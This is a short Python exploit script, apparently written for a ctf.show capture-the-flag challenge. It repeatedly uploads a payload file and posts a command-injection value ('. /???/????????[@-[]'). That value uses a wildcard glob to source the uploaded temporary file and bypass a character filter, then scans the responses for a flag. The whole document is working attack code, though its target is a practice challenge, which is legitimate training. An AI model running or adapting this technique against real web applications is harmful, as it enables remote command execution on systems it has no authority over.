import requests
import time
import sys

TARGET_URL = "http://5fedc0ec-b7a0-4b29-b0f0-ffb5f6b3adf8.challenge.ctf.show/"
PAYLOAD_FILE_PATH = "payload.txt"
CHECK_FLAG_STR = "CTF{"
TIMEOUT_SECONDS = 300  # 5分钟总超时

start_time = time.time()
with open(PAYLOAD_FILE_PATH, "r", encoding="utf-8") as f:
    file = {"file": f}
    data = {"code": ". /???/????????[@-[]"}

    print(f"开始向 {TARGET_URL} 发送请求...")

    while time.time() - start_time < TIMEOUT_SECONDS:
        try:
            response = requests.post(
                TARGET_URL, files=file, data=data, timeout=10, allow_redirects=False
            )

            if CHECK_FLAG_STR in response.text:
                start = response.text.find(CHECK_FLAG_STR)
                end = response.text.find("}", start) + 1
                flag = (
                    response.text[start:end] if end > start else response.text[start:]
                )
                print(f"✅ 找到Flag：{flag}")
                sys.exit(0)
            else:
                print(f"⏳ 未找到flag，1秒后重试...")
                time.sleep(1)

        except Exception as e:
            print(f"请求失败：{e}")
            time.sleep(1)

print(f"⏰ 超时：{TIMEOUT_SECONDS}秒内未找到flag")
sys.exit(1)
